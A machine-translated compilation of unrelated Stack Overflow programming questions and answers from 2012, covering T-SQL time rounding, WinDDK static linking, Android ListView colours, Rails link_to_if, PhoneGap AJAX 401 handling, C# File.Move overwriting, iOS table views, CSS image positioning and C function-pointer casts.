我需要编写一个函数，在一个列中舍入时间以从其原始时间开始（例如：23:33:00.0000000 将是 23:00）并在另一列中舍入到下一个小时（例如：23:33 :00.0000000 将是 24:00），然后将这些新值插入到新列中。我在 Stack Overflow 上的[How to Round a Time in T-SQL 中](https://stackoverflow.com/q/249794/61754)找到了这个函数，但我无法运行该函数。我不断收到此错误消息：'Msg 156，Level 15，State 1，Procedure RoundTime，Line 11 关键字'SELECT'附近的语法不正确。'

```
CREATE FUNCTION [dbo].[RoundTime] (@Time datetime, @RoundTo float)
RETURNS datetime
AS
BEGIN
   DECLARE @RoundedTime smalldatetime
   DECLARE @Multiplier float
   SET @Multiplier= 24.0/@RoundTo
   SET @RoundedTime= ROUND(CAST(CAST(CONVERT(varchar,@Time,121) AS datetime) AS float) * @Multiplier,0)/@Multiplier
   RETURN @RoundedTime
END
SELECT [dbo].[RoundTime] ('23:33',0.0) 
```

我也试过用 SELECT dbo.roundtime('23:33',0.0) 运行它，但仍然没有乐趣。

因此，我希望通过运行此功能来尝试弄清楚如何缩短时间，但我什至无法运行它。而且我不知道如何让时间回到最早的时间点。我是否只需要从时间戳中提取小时，然后将该小时插入到它的新列中？或者有没有办法即时转换它然后将其插入新列？我正在使用 Sql Server 2008。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-24T20:05:16.893

该函数必须存在才能引用它。在函数声明后添加一个 GO，将创建与使用分开。

```
CREATE FUNCTION [dbo].[RoundTime] (@Time datetime, @RoundTo float)
RETURNS datetime
AS
BEGIN
   DECLARE @RoundedTime smalldatetime
   DECLARE @Multiplier float
   SET @Multiplier= 24.0/@RoundTo
   SET @RoundedTime= ROUND(CAST(CAST(CONVERT(varchar,@Time,121) AS datetime) AS float) * @Multiplier,0)/@Multiplier
   RETURN @RoundedTime
END
GO

SELECT [dbo].[RoundTime] ('23:33',0.0) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-24T20:05:06.913

`SET @Multiplier= 24.0/@RoundTo`并且您传入`0.0`的值是`@RoundTo` 如果您传入会发生什么`1.0`？

现在您已经运行它，删除该函数并将其替换为：

```
CREATE FUNCTION [dbo].[RoundTime] 
(
    @Time datetime, 
    @RoundTo float
) 
RETURNS datetime 
AS 
BEGIN    
    DECLARE @RoundedTime datetime    
    DECLARE @Multiplier float    
    SET @Multiplier= 24.0/@RoundTo    
    SET @RoundedTime= FLOOR(CAST(CAST(CONVERT(varchar,@Time,121) AS datetime) AS float) * @Multiplier)/@Multiplier    
    RETURN @RoundedTime 
END 
```

将 @RoundedTime 变量从 smalldatetime 切换到 datetime 可以阻止它浪费时间。更改`Round`为`Floor`让您获得您正在寻找的第一个号码，并且您知道您总是会增加一个小时。您可能想要重命名该函数以匹配它现在正在执行的操作...

哦，第二个参数应该是 1.0 ( `SELECT [dbo].[RoundTime] ('23:33:45',1.0)`)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-24T20:19:05.373

我不确定你为什么会得到语法错误，但是当我运行它时，我得到一个除以零的错误。我不认为该函数应该在第二个参数中使用 0 运行。但这让你无法四舍五入我认为。在这种情况下，您可以只使用 1 作为第二个参数，该参数向上舍入到下一个小时，然后执行 dateadd -1 小时返回。（或增强功能）。

# linker - 使用 WinDDK 静态链接多个库

> ID：10305175
> 
> 赞同：0
> 
> 时间：2012-04-24T20:01:22.463
> 
> 标签：linker, makefile, nmake, wdk

我正在使用 DDK 构建一个项目。一些构建目标生成小型内部库——为简单起见，我们称它们为 LibA.lib、LibB.lib 和 LibC.lib。但是 LibA 的代码引用了 LibB 和 LibC 的代码。要在项目中使用 LibA，您还需要包含 LibB.lib 和 LibC.lib 以解析所有依赖项。 **我想要做的是将 LibB 和 LibC 链接到 LibA 中，这样用户只需要包含 LibA.lib**。我怎样才能做到这一点？

LibA 的 SOURCES 文件如下所示：

```
TARGETNAME=LibA
TARGETTYPE=LIBRARY

TARGETPATH=..\lib\$(DDKBUILDENV)

INCLUDES = .; \
           ..\LibB; \
           ..\LibC; \
           $(CRT_INC_PATH) \
           $(SDK_INC_PATH)

SOURCES = LibA_main.cpp \
          LibA_file2.cpp \
          LibA_file3.cpp 
```

我了解您可以手动将库与`link.exe`; 例如，

```
link.exe /lib LibA.lib LibB.lib LibC.lib 
```

但如果可能的话，我希望通过某种方式来实现与 LibA 构建过程的一部分相同的效果，因为构建过程后期的一些目标依赖于 LibA。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-18T15:28:35.110

我意识到这是一个迟到的答案，最终它甚至可能不是你想要的。但是，[`ddkbuild.cmd`](http://www.osronline.com/article.cfm?article=43)它有一个非常漂亮的机制来在特定目录中构建之前和之后运行操作。

我们在我们的一个驱动程序库中使用它，该驱动程序库必须构建为多个静态库，并作为最后一步链接到一个大型静态库，就像您想要的那样。如果您能够`ddkbuild.cmd`在您的项目中使用类似的东西，这将提供一个解决方案，并且它也是一个适用于自动构建的解决方案。

注意：据我所知，您无法直接使用`build.exe`. 但是，很可能通过一些 make (NMake) 文件杂技，您可以获得类似的结果。所以问题是，当已经有一个轮子时，是否值得重新发明轮子。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-11T22:39:44.223

lib 实用程序可以组合库。使用您的示例，命令将是：

```
lib /out:CombinedLib.lib LibA.lib LibB.lib LibC.lib 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-14T19:39:46.727

我遇到了和你一样的情况。谷歌了很多，仍然没有解决方案。幸运的是，我终于找到了解决它的方法。您可以尝试一下，在您的 libA 源文件中添加以下语句。

```
LIBRARIAN_FLAGS = $(LIBRARIAN_FLAGS) libB.lib libC.lib 
```

# android - Android - 具有 2 种不同颜色的 ListView

> ID：10305176
> 
> 赞同：6
> 
> 时间：2012-04-24T20:01:28.187
> 
> 标签：android, colors, background

我有一个 ListView，我想更改它的 Backgroundcolor。它应该是这样的。1.项目=灰色；2.项目；白色的; 3.项目=灰色；4.项目=白色等。所以它应该有2个背景色。我试图将其归档近 2 小时。我越来越糊涂了。我无法找到解决方案。我希望你们中的某个人可以帮助我。

我试过了：

```
 for(int counter = 0; counter < itemList.size(); counter++){
            if( adapter.getItem(position) %2 == 1 ){
               Layout.setBackgroundColor(Color.GREY)
                    };
          else{
            Layout.setBackgroundColor(Color.WHITE);
              } 
```

所以这是我的漏洞代码。希望有人能告诉我：

**主要活动**

```
public class MainActivity extends Activity implements OnItemClickListener {

    ListView lview3;
    ListViewCustomAdapter adapter;
    private ArrayList<Object> itemList;
    private ItemBean bean;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

        prepareArrayLits();
        lview3 = (ListView) findViewById(R.id.listView1);
        adapter = new ListViewCustomAdapter(this, itemList);
        lview3.setAdapter(adapter);

        lview3.setOnItemClickListener(this);
    }

    public void onItemClick(AdapterView<?> arg0, View arg1, int position, long id) {
        // TODO Auto-generated method stub
         RelativeLayout Layout = (RelativeLayout) findViewById(R.id.relativeLayout1);
        ItemBean bean = (ItemBean) adapter.getItem(position);
         for(int counter = 0; counter < itemList.size(); counter++){
             adapter.getItem(position);
            Layout.setBackgroundColor(Color.CYAN);}

        Toast.makeText(this, "Title => "+bean.getTitle()+" \n Description => "+bean.getDescription(), Toast.LENGTH_SHORT).show();
    }

    /* Method used to prepare the ArrayList,
     * Same way, you can also do looping and adding object into the ArrayList.
     */
    public void prepareArrayLits()
    {
        itemList = new ArrayList<Object>();

        AddObjectToList(R.drawable.ic_add, "add", "Add desc", "2");
        AddObjectToList(R.drawable.ic_delete, "Delete", "Delete desc", "2");
        AddObjectToList(R.drawable.ic_down, "Down", "Down desc", "2");
        AddObjectToList(R.drawable.ic_info, "Information", "Information desc", "2");
        AddObjectToList(R.drawable.ic_help, "Help", "Help desc", "2");
        AddObjectToList(R.drawable.ic_download, "Download", "Download desc", "2");
        AddObjectToList(R.drawable.ic_mail, "Mail", "Mail desc", "2");
        AddObjectToList(R.drawable.ic_search, "Search", "Search desc", "2");
        AddObjectToList(R.drawable.ic_settings, "Settings", "Settings desc", "2");

    }

    // Add one item into the Array List
    public void AddObjectToList(int image, String title, String desc, String duration)
    {

        bean = new ItemBean();
        bean.setduration(duration);
        bean.setDescription(desc);
        bean.setImage(image);
        bean.setTitle(title);
        itemList.add(bean);
    }

} 
```

**项目豆**

```
public class ItemBean 
{
    String title;
    String description;
    int image;
    String duration;

    public String getTitle() {
        return title;
    }
    public String getDuration() {
        return duration;
    }

    public void setTitle(String title) {
        this.title = title;
    }

    public String getDescription() {
        return description;
    }

    public void setDescription(String description) {
        this.description = description;
    }

    public int getImage() {
        return image;
    }

    public void setImage(int image) {
        this.image = image;
    }   

    public void setduration(String duration) {
        this.duration = duration;
    }   
} 
```

**列表视图自定义适配器**

```
public class ListViewCustomAdapter extends BaseAdapter{

    ArrayList<Object> itemList;

    public Activity context;
    public LayoutInflater inflater;

    public ListViewCustomAdapter(Activity context,ArrayList<Object> itemList) {
        super();

        this.context = context;
        this.itemList = itemList;

        this.inflater = (LayoutInflater)context.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
    }

    public int getCount() {
        // TODO Auto-generated method stub
        return itemList.size();
    }

    public Object getItem(int position) {
        // TODO Auto-generated method stub
        return itemList.get(position);
    }

    public long getItemId(int position) {
        // TODO Auto-generated method stub
        return 0;
    }

    public static class ViewHolder
    {
        ImageView imgViewLogo;
        TextView txtViewTitle;
        TextView txtViewDescription;
        TextView duration;
    }

    public View getView(int position, View convertView, ViewGroup parent) {
        // TODO Auto-generated method stub

        ViewHolder holder;
        if(convertView==null)
        {
            holder = new ViewHolder();
            convertView = inflater.inflate(R.layout.items, null);

            holder.imgViewLogo = (ImageView) convertView.findViewById(R.id.imgViewLogo);
            holder.txtViewTitle = (TextView) convertView.findViewById(R.id.txtViewTitle);
            holder.txtViewDescription = (TextView) convertView.findViewById(R.id.txtViewDescription);
            holder.duration = (TextView) convertView.findViewById(R.id.duration);

            convertView.setTag(holder);
        }
        else
            holder=(ViewHolder)convertView.getTag();

        ItemBean bean = (ItemBean) itemList.get(position);

        holder.imgViewLogo.setImageResource(bean.getImage());
        holder.txtViewTitle.setText(bean.getTitle());
        holder.txtViewDescription.setText(bean.getDescription());
        holder.duration.setText(bean.getDuration());

        return convertView;
    }

} 
```

**XML 布局：** **项目**

```
<RelativeLayout     android:id="@+id/relativeLayout1"   android:layout_width="fill_parent"  android:layout_height="wrap_content"    android:background="@drawable/list_selector"    xmlns:android="http://schemas.android.com/apk/res/android"  android:padding="5dip">

    <ImageView
        android:layout_width="50dip"
        android:layout_height="50dip"
        android:padding="3dip"  
        android:id="@+id/imgViewLogo"
        android:src="@drawable/icon"
        android:layout_alignParentLeft="true"
        android:layout_centerInParent="true"
        android:background="@drawable/image_bg" 
        android:layout_marginRight="5dip"
        android:scaleType="center"
        >
    </ImageView>

    <TextView
        android:textAppearance="?android:attr/textAppearanceLarge"
        android:layout_height="wrap_content"
        android:layout_alignTop="@+id/imgViewLogo"
        android:text="TextView"
        android:layout_width="wrap_content"
        android:id="@+id/txtViewTitle"
        android:layout_toRightOf="@+id/imgViewLogo"
        android:textColor="#040404"
        android:typeface="sans" 
        android:textSize="20dip"
        android:textStyle="bold"
        android:layout_marginRight="15dp"
        >
    </TextView>

    <TextView
        android:layout_height="wrap_content"
        android:text="TextView"
        android:layout_width="wrap_content"
        android:id="@+id/txtViewDescription"

         android:textColor="#343434"
        android:textSize="15dip"
        android:layout_marginTop="1dip"
        android:layout_toRightOf="@+id/imgViewLogo"
        android:layout_below="@+id/txtViewTitle"
        android:layout_marginLeft="2dip"
        android:layout_marginRight="15dp"
        >
    </TextView>
    <TextView
        android:id="@+id/duration"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_alignParentRight="true"
        android:layout_alignTop="@+id/txtViewTitle"
        android:gravity="right"
        android:layout_marginRight="5dip"
        android:textSize="15dip"
        android:textColor="#10bcc9"
        android:textStyle="bold"/>

     <ImageView android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:src="@drawable/arrow"
        android:layout_alignParentRight="true"
        android:layout_centerVertical="true"

        />

</RelativeLayout> 
```

**布局：** **主要**

```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:orientation="vertical"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"

    >

    <ListView 
        android:id="@+id/listView1"
        android:layout_width="fill_parent"
        android:layout_height="fill_parent"
        android:divider="#b5b5b5"
        android:dividerHeight="1dp"
        android:listSelector="@drawable/list_selector" 
        />

</LinearLayout> 
```

每个提示都会有所帮助，谢谢。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-04-24T20:07:39.860

`for`事后不要使用该循环设置背景颜色。以您`getView`的适配器方法执行此操作。试试这个：

```
public View getView(int position, View convertView, ViewGroup parent) {

    /* remainder is unchanged */

    convertView.setBackgroundColor(position % 2 == 0 ? Color.WHITE : Color.GREY);
    return convertView;
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2016-05-18T21:23:47.640

这是使用选择器切换器更改背景的另一种方法。使用此方法将保留选择器的悬停和焦点颜色。

```
public View getView(int position, View convertView, ViewGroup parent) {

    /* remainder is unchanged */

   convertView.setBackgroundResource(position % 2 == 0 ? R.drawable.list_selector_first : R.drawable.list_selector_second);
    return convertView;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-24T20:08:11.723

您可以通过在自定义适配器的 getView 函数中设置背景来轻松完成此操作。

试试这个代码：

```
 if(position % 2 == 0)
            convertView.setBackgroundColor(Color.GREY);
    else
            convertView.setBackgroundColor(Color.WHITE); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-24T20:10:32.613

您可以根据传入的项目位置从 getView 返回不同的视图。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2014-01-05T16:41:52.070

我相信你可以根据职位来做到这一点

```
 if (position == 0)
        {
            view.SetBackgroundColor(Android.Graphics.Color.gray);  
        }
        else if (position == 1)
        {
            view.SetBackgroundColor(Android.Graphics.Color.white);
        } 
```

等等取决于你有多少职位。

# ruby-on-rails - Rails：如何根据条件显示带有或不带有链接的块（link_to_if）

> ID：10305180
> 
> 赞同：8
> 
> 时间：2012-04-24T20:01:50.000
> 
> 标签：ruby-on-rails, link-to

我有一个复杂的标签块（`<h3>`, `<p>`, ...），我想根据条件使用链接或不使用链接来呈现它们。

我知道`link_to_if`这样的工作方式：

```
<% link_to_if condition, name, path %> 
```

如果条件是`false`只有名称将被呈现。

我知道`link_to`with `&block`：

```
<% link_to path do %>
  [complex content]
<% end %> 
```

我想要两者的结合。接受 a的`link_to_if`语句`&block`，如果条件为 ，则该块将在没有链接的情况下呈现`false`。不幸的是，`link_to_if`带有 a`&block`的声明不像`link_to`声明:(

有人对我有建议吗？非常感谢任何帮助

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2012-04-24T21:21:18.930

我为此编写了自己的助手：

```
 def link_to_if_with_block condition, options, html_options={}, &block
     if condition
       link_to options, html_options, &block
     else
       capture &block
     end
   end 
```

你可以像这样使用它：

```
<%= link_to_if_with_block true, new_model_path { "test" } %>
<%= link_to_if_with_block true, new_model_path do %>
  Something more complicated
<% end %> 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2014-09-18T15:19:33.577

我只是覆盖了内置方法，因为它们提供的块使用对我们的使用没有多大意义。只需将它添加到帮助程序中，这将使 link_to_if 像 link_to 一样工作。

```
def link_to_if(*args,&block)
  args.insert 1, capture(&block) if block_given?

  super *args
end 
```

# android - Android Phonegap：$.ajax 不会触发未经授权的回调 (401)

> ID：10305181
> 
> 赞同：3
> 
> 时间：2012-04-24T20:01:56.650
> 
> 标签：android, cordova

我正在使用 PhoneGap 构建一个 Android 应用程序。使用 jQuery 或 Zepto，我可以使用 $.ajax 调用来调用网站 API。但是，当网站返回 401（未经授权）响应时，似乎没有来自 ajax 调用的回调——“成功”、“错误”或“完成”都没有被调用。

请注意，当响应为 200 或 500 时，相同的代码可以正常工作。

我将 Zepto 1.0rc1 和/或 jQuery 1.7.2 与 PhoneGap 1.6.1 一起使用。

```
function make_base_auth(user, password) {
    var tok = user + ':' + password;
    var hash = btoa(tok);
    return "Basic " + hash;
}

$('#button').on('touchstart', function() {
    console.log("UPLOAD --- ");
    $.ajax({
        url: 'https://mywebsite/api/v1.0/test/?ts=' + new Date().getTime(),
        type: 'GET',
        beforeSend: function (xhr){ 
            xhr.setRequestHeader('Authorization', make_base_auth('username', 'password')); 
        },
        success: function(data, status, xhr) {
            console.log("AJAX: SUCCESS: " + data);
            $('h1').text("AJAX!!");
        },
        error: function(xhr, errortype, error) {
            console.log("AJAX: FAIL: " + errortype + " - " + error);
            $('h1').text("AJAX FAIL");
        },
        complete: function() {
            console.log("--- Complete");
        }
    });
    return false;
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-22T19:41:02.223

我只是有同样的问题。当我得到 HTTP 401 并使用

```
$.ajax({
    ...
    timeout: 5000, // Some timeout value that makes sense
    ...
}); 
```

然后使用 调用错误回调`{"readyState":0,"status":0,"statusText":"timeout"}`。在这种情况下，您将不得不猜测真正的错误是 HTTP 401。

或者，您可以使用

```
$.ajax({
    ...
    async: false, // :-(
    ...
}); 
```

你的错误回调会得到类似的东西`{"readyState":4,"responseText":"<html>...</html>","status":401,"statusText":"Unauthorized"}`。

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-05-08T18:37:33.407

降级phonegap。是的。你没看错。

我试过 1.4.1：没用。

我试过 1.3.0: 有效。

所以，是的，就是这样。

# c# - 如果目标已存在，则模拟 File.Move

> ID：10305187
> 
> 赞同：7
> 
> 时间：2012-04-24T20:02:29.810
> 
> 标签：c#, file, copy

从以下文档[`File.Move`](http://msdn.microsoft.com/en-us/library/system.io.file.move.aspx)：

> 请注意，如果您尝试通过将同名文件移动到该目录来替换文件，则会收到 IOException。您不能使用 Move 方法覆盖现有文件。

简而言之，您不能覆盖 on `Move`，因此为了便于在 Move 上覆盖，我通过执行 a`File.Copy`后跟 a来模仿行为`File.Delete`。就像是：

```
if (File.Exists(dstFileName))
{
    // System.IO.File.Move cannot be used to overwrite existing files, so we're going
    // to simulate that behavior with a Copy & Delete.
    File.Copy(procContext.FileName, dstFileName);
    File.Delete(procContext.FileName);
}
else
    File.Move(procContext.FileName, dstFileName); 
```

我的问题是：是否有任何我需要防范的情况可能导致源文件在没有先被成功复制的情况下被删除？

从阅读文档中我的理解是，因为`File.Copy`它不返回任何东西，它应该在任何情况下都没有成功抛出异常。有没有人遇到过不正确的情况？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-04-24T20:16:27.723

我建议你先探测目标文件是否存在，如果存在，则将其删除。然后执行正常的移动操作。

由于这个序列不是原子的，如果目标存在，您可能想要重命名它而不是删除它，以避免在移动失败时丢失它。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2014-02-19T14:11:48.070

The correct way to do it would be to call

```
File.Replace(source, destination, copy) 
```

That does the trick for me

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-04-24T20:24:16.400

如果操作系统没有为您提供良好的原子操作，则很难模拟原子操作。 `Move`在某些但不是所有文件系统上是原子的，但在将磁盘移动到磁盘时则不是。

在同一个磁盘的情况下，`Delete`+`Move`有点优雅（快速且安全），因为它不会以任何方式真正填充数据。您可以进一步将其扩展到

```
try
{
    Move(dest, tmp);
    Move(src, dest);
    Delete(tmp);
}
catch
{
    try
    {
        Move(tmp, dest);
    }
    catch
    {
    }
    throw;
} 
```

（例如，当您没有完成移动所需的权限时，这样就不太可能丢失目标文件。）

在您不知道它是同一个磁盘的情况下，您的解决方案足够安全且足够简单。但是，它甚至会在同一个磁盘中复制数据，从而为您带来更大的电源故障风险窗口。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-04-24T20:07:31.513

这是安全的。File.Copy 要么完全成功，要么抛出。当然，删除可能会失败，将源文件作为垃圾留在后面。

但是，如果您的计算机崩溃，则无法保证复制操作已经加固了数据。在这种情况下，您可能会丢失数据。

在正常操作期间，这是安全的。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-24T20:26:53.497

检查文件“目标”是否存在。如果没有，请复制您的文件。

If yes: Move "Target" to temp dir, where you can be sure, that the move will be successful. You can generate a subdir in Temp with the name auf an UUID. Then copy your file.

# objective-c - cellForRowAtIndexPath 不会触发

> ID：10305188
> 
> 赞同：-1
> 
> 时间：2012-04-24T20:02:30.280
> 
> 标签：objective-c, xcode, cocoa-touch

不明白为什么 cellForRowAtIndexPath 从未被调用，即使 numberOfRowsInSection 被调用我调用这个 ViewController

ServerDataController *dataController = [[ServerDataController alloc] initWithNibName:@"ServerDataController" bundle:nil];

[self presentModalViewController:dataController Animation:YES];

这是我的代码： 头文件：

```
#import <UIKit/UIKit.h>

@interface ServerDataController : UIViewController <NSXMLParserDelegate, NSURLConnectionDelegate, UITableViewDataSource>
{
...
    NSMutableArray *items;
    UITableView *docsTableView;

}
@property (retain, nonatomic) IBOutlet UITableView *docsTableView;

@property (nonatomic, readonly) NSMutableArray *items;

@end 
```

实现文件：

```
#import "ServerDataController.h"

@implementation ServerDataController
@synthesize docsTableView;
@synthesize items;

- (id)initWithNibName:(NSString *)nibNameOrNil bundle:(NSBundle *)nibBundleOrNil
{
    self = [super initWithNibName:nibNameOrNil bundle:nibBundleOrNil];
    if (self) {
    }
    return self;
}

- (id)init
{
    self = [super init];

    if (self)
    {

    }

    return self;
}

- (void)dealloc {

    [items release];
    [docsTableView release];
    [super dealloc];
}

- (void)viewDidAppear:(BOOL)animated
{
    [self fetchEntries];
    animated = YES;
}

- (void)didReceiveMemoryWarning
{
    // Releases the view if it doesn't have a superview.
    [super didReceiveMemoryWarning];

    // Release any cached data, images, etc that aren't in use.
}

#pragma mark - View lifecycle

- (void)viewDidLoad
{
    [super viewDidLoad];
    // Do any additional setup after loading the view from its nib.

    if (self) {
        items = [[NSMutableArray alloc] init];
    }
}

- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section
{
    return [[self items] count];
}

- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath;
{
    static NSString *CellIdentifier = @"Cell";
    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];
    if (cell == nil) {
        cell = [[[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:CellIdentifier] autorelease];
    }
    NSString *cellTitle = [[[[items objectAtIndex:indexPath.row] docUrl] lastPathComponent] stringByDeletingPathExtension];

    cell.textLabel.text = cellTitle;
    return cell;
} 
```

有什么建议么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-24T20:11:17.957

我看不到您将项目添加到数组的位置，只有 viewDidLoad 中的一个 init，我认为它是空的，所以这就是为什么永远不会调用该函数的原因。根本没有要显示的项目。

# html - 在 div html5 css3 中移动图像

> ID：10305191
> 
> 赞同：1
> 
> 时间：2012-04-24T20:02:40.637
> 
> 标签：html, css

如果我想将图像从 div 的顶部移动 50 像素，从左侧移动 50 像素（我不是在谈论动画，我应该使用填充吗？）

```
<header>
<img src="logo.png" alt="" />
</header>

header {
 width...
height:
background: (url)
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-24T20:05:39.337

您可以将图像指定为背景：

```
<header></header> 
```

CSS：

```
header {
  background-image:url(logo.png) 50px 50px;
} 
```

或者，使用`absolute`定位：

```
<header>
  <img src="logo.png" alt="" />
</header> 
```

CSS：

```
header { position:relative; }
header img {
  position:absolute;
  top:50px;
  left:50px;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-24T20:10:16.417

我认为您正在寻找的解决方案是：

标题{填充：50px 0px 0px 50px }

这将创建距顶部 50 像素和距标题左侧 50 像素的填充

谢谢。

# c - 将函数指针转换为 void 有什么影响？

> ID：10305192
> 
> 赞同：0
> 
> 时间：2012-04-24T20:02:41.497
> 
> 标签：c, struct, function-pointers, void-pointers, function-prototypes

所以我第 64 次尝试编写一个缓冲库，我开始研究一些非常高级的东西。以为我会要求对此进行一些专业的投入。

在我的第一个头文件中，我有这个：

```
typedef struct StdBuffer { void* address; } StdBuffer;
extern void StdBufferClear(StdBuffer); 
```

在第一个头文件的另一个头文件中，`#includes`我有这个：

```
typedef struct CharBuffer { char* address; } CharBuffer;
void (*CharBufferClear)(CharBuffer) = (void*) StdBufferClear; 
```

声明这个函数指针 void 会干扰调用吗？它们具有按值签名匹配。我以前从未见过声明为 void 的函数指针，但它是让它干净编译的唯一方法。

Stackwise 它应该与我在汇编程序编码中学到的东西没有任何区别。

**无关紧要的天哪**！我刚刚在 StackOverflow 上说 Stackwise！

嗯..看起来我在这里假设太多了。如果可以，请允许我再次澄清。我不在乎地址中存储了什么“类型”的数据。我所关心的只是一个“单元”的大小以及地址上有多少个单元。如果您愿意，请查看 API 的接口协议合约：

```
typedef struct StdBuffer {

    size_t width;        ///< The number of bytes that complete a data unit.
    size_t limit;        ///< The maximum number of data units that can be allocated for this buffer.
    void * address;      ///< The memory address for this buffer.
    size_t index;        ///< The current unit position indicator.
    size_t allocated;    ///< The current number of allocated addressable units.
    StdBufferFlags flags;///< The API contract for this buffer.

} StdBuffer; 
```

你看，memcpy、memmove 之类的并不真正关心地址上的内容，他们想要的只是我清楚地在这里跟踪的细节。

现在看一下遵循此合同的第一个原型：

```
typedef struct CharBuffer {

    size_t width;        ///< The number of bytes that complete a data unit.
    size_t limit;        ///< The maximum number of data units that can be allocated for this buffer.
    char * address;      ///< The memory address for this buffer.
    size_t index;        ///< The current unit position indicator.
    size_t allocated;    ///< The current number of allocated addressable units.
    CharBufferFlags flags;///< The API contract for this buffer.

} CharBuffer; 
```

正如您清楚地看到的那样，数据类型在这种情况下是无关紧要的。您可以说 C 会根据情况以不同的方式处理它，但归根结底，只要我们在同一台机器上处理内存，an`address`就是 an `address`， a`byte`是`byte`和 a`long`是 a 。`long`

这个系统组合在一起的目的是消除所有这种类型的杂耍 C 似乎很自豪（而且理所当然地......）它对我想做的事情毫无意义。这是为位于任何地址的任何标准大小的数据（1、2、4、8、sizeof(RandomStruct)）创建一个遵守合同的原型。

能够使用代码执行我自己的转换，并使用 api 函数操作该数据，这些函数在具有特定长度内存单元的特定长度内存块上运行。但是，原型必须包含官方数据指针类型，因为最终用户每次想要使用该地址指针做某事时都必须重新转换他们的数据是没有意义的。如果指针为空，则称其为 CharBuffer 是没有意义的。

是一种通用类型，除了在 api 本身内之外，`StdBuffer`永远不会使用它来管理所有遵守合同的数据类型。

该系统将包含的 api 来自我最新版本的缓冲。[@Google Code](http://code.google.com/p/c-string-buffer/source/browse/Source/StringBuffer.c?r=e8485834ce5caa6373804202fb3d0facc802f5fd "在谷歌代码这里")这里非常清楚地记录了这一点，我知道有些事情需要改变才能将这一切整合在一起，即如果没有大量适当的研究和意见收集，我将无法直接从 api 中安全地操作数据。

这让我注意到我还需要 StdBufferFlags 成员中的有符号/无符号位标志。

也许这个谜题的最后一部分也是为了让你细读。

```
/** \def BIT(I)
    \brief A macro for setting a single constant bit.
 *
 *  This macro sets the bit indicated by I to enabled.
 *  \param I the (1-based) index of the desired bit to set.
 */
 #define BIT(I) (1UL << (I - 1))

/** \enum StdBufferFlags
    \brief Flags that may be applied to all StdBuffer structures.

 *  These flags determine the contract of operations between the caller
 *  and the StdBuffer API for working with data. Bits 1-4 are for the
 *  API control functions. All other bits are undefined/don't care bits.
 *
 *  If your application would like to use the don't care bits, it would
 *  be smart not to use bits 5-8, as these may become used by the API
 *  in future revisions of the software.

*/
typedef enum StdBufferFlags {

    BUFFER_MALLOCD = BIT(1),    ///< The memory address specified by this buffer was allocated by an API
    BUFFER_WRITEABLE = BIT(2),  ///< Permission to modify buffer contents using the API
    BUFFER_READABLE = BIT(3),   ///< Permission to retrieve buffer contents using the API
    BUFFER_MOVABLE = BIT(4)     ///< Permission to resize or otherwise relocate buffer contents using the API

}StdBufferFlags; 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-24T20:09:17.037

此代码需要诊断：

```
void (*CharBufferClear)(CharBuffer) = (void*) StdBufferClear; 
```

您正在将`void *`指针转换为没有强制转换的函数指针。在 C 中，`void *`指针可以在没有强制转换的情况下转换为指向对象类型的指针，但不能转换为函数指针类型。（在 C++ 中，为了增加安全性，还需要转换来转换`void *`为对象类型。）

您在这里想要的只是在函数指针类型之间进行转换，即：

```
void (*CharBufferClear)(CharBuffer) = (void (*)(CharBuffer)) StdBufferClear; 
```

然后你仍然在做相同类型的双关语，因为函数是不同的类型。您正在尝试调用一个函数，该函数`StdBuffer`使用一个指向一个函数的指针，该函数使用一个`CharBuffer`.

这种类型的代码不是定义明确的 C。在打败了类型系统之后，你靠自己，依靠测试、检查目标代码，或者从编译器编写者那里获得一些保证，这种事情适用于那个编译器.

您在汇编程序编码中学到的内容并不适用，因为汇编语言只有少量基本数据类型，例如“机器地址”或“32 位字”。具有相同布局和低级表示的两个数据结构可能是不兼容类型的概念不会出现在汇编语言中。

即使两种类型在低级别看起来相同（另一个示例：`unsigned int`有时`unsigned long`完全相同），C 编译器也可以基于没有违反类型规则的假设来优化程序。例如，假设它`A`指向`B`同一个内存位置。如果您分配给一个 object `A->member`，C 编译器可以假定该对象`B->member`不受此影响，如果`A->member`并且`B->member`具有不兼容的类型，例如 one being`char *`和 other `void *`。生成的代码一直在寄存器中缓存 的旧值`B->member`，即使内存中的副本被对`A->member`. 这是一个无效*别名*的例子。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-24T20:11:53.363

该标准没有定义将函数指针转换为`void *`.

